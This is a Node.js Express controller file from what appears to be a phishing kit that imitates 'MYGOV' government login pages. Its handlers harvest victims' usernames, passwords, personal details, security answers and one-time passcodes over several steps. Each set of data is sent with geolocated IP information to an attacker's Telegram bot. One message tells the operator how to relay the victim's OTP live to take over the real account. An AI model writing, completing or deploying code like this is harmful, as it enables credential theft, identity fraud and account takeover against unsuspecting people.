const { sendMessageFor } = require("simple-telegram-message");
const { getClientIp } = require("request-ip");
const { botToken, chatId } = require("../config/settings");
const axios = require('axios');
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;




exports.login = (req, res) => {
	return res.render("login");
};

exports.loginPost = async (req, res) => {
	const { username, password } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    // Move the console.log statement outside the sendAPIRequest function
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];

	const message =
		`✅ UPDATE TEAM | MYGOV | USER_${ipAddress}\n\n` +
		`👤 LOGIN INFO\n` +
		`USERNAME         : ${username}\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
        `CITY             : ${ipAddressInformation.location.city}\n` +
        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
        `💻 SYSTEM INFO\n` +
        `USER AGENT       : ${userAgent}\n` +
        `SYSTEM LANGUAGE  : ${systemLang}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

    const sendMessage = sendMessageFor(botToken, chatId);
    sendMessage(message);

	console.log(message);

    res.redirect("/auth/login?_step=1");
    
} catch (error) {
	// Handle any unexpected errors here
	console.error('Unexpected error:', error.message);
	res.status(500).send('Internal Server Error');
}
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Handle the rejection
});

	
};

exports.login2 = (req, res) => {
	res.render("login2");
};

exports.loginPost2 = async (req, res) => {
	const { username, password } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


        const message =
            `✅ UPDATE TEAM | MYGOV | USER_${ipAddress}\n\n` +
            `👤 RELOGIN INFO\n` +
			`USERNAME         : ${username}\n` +
			`PASSWORD         : ${password}\n\n` +
            
            `🌍 GEO-IP INFO\n` +
          `IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
            `💬 Telegram: https://t.me/UpdateTeams\n`;
            

        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
        sendMessage(message);

        res.redirect("/auth/login?_step=2");
    } catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};


exports.login3 = (req, res) => {
	return res.render("login3");
};

exports.loginPost3 = async (req, res) => {
	const { fullName, address, zip, phone, dob, ssn } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];



	const message =
		`✅ UPDATE TEAM | MYGOV | USER_${ipAddress}\n\n` +
		`👤 PERSONAL INFO\n` +
		`FULL NAME        : ${fullName}\n` +
		`STREET ADDRESS   : ${address}\n` +
		`ZIP CODE         : ${zip}\n` +
		`PHONE NUMBER     : ${phone}\n` +
		`DOB              : ${dob}\n\n` +
		
		`🌍 GEO-IP INFO\n` +
		 `IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`💬 Telegram: https://t.me/UpdateTeams\n`;
            

        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
        sendMessage(message);

        res.redirect("/auth/login?_step=3");
    } catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.login4 = (req, res) => {
	return res.render("login4");
};

exports.loginPost4 = async (req, res) => {
	const { q1, a1, q2, a2, q3, a3 } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


	const message =
		`✅ UPDATE TEAM | MYG0V | USER_${ipAddress}\n\n` +
		`❓ SECRET QUESTIONS\n` +
		`QUESTION 1       : ${q1}\n` +
		`ANSWER 1         : ${a1}\n` +
		`QUESTION 2       : ${q2}\n` +
		`ANSWER 2         : ${a2}\n` +
		`QUESTION 3       : ${q3}\n` +
		`ANSWER 3         : ${a3}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

		const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
        sendMessage(message);
        
		res.redirect("/auth/login?_step=4");
	} catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.login5 = (req, res) => {
	const otpMsg =
		`🚨 USER IS NOW WAITING FOR OTP CODE\n` +
		`🚨 FOLLOW THE STEPS BELOW TO REQUEST OTP CODE\n\n` +
		`Step 1: Login to site or app using login details you just received.\n` +
		`Step 2: OTP code will be sent to the User.\n` +
		`Step 3: User will input OTP code in page.\n` +
		`Step 4: OTP code will be sent here.\n` +
		`Step 5: Now input OTP Code on site or app to login.`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(otpMsg);
	
	return res.render("login5");
};

exports.loginPost5 = async (req, res) => {
	const { otp } = req.body;
	const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
 
	const message =
		`✅ UPDATE TEAM | MYG0V | USER_${ipAddress}\n\n` +
		`👤 OTP INFO\n` +
		`OTP CODE         : ${otp}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login?_step=complete");
	} catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};


exports.complete = (req, res) => {
	return res.render("complete");
};

exports.page404Redirect = (req, res) => {
	return res.redirect("/auth/login");
};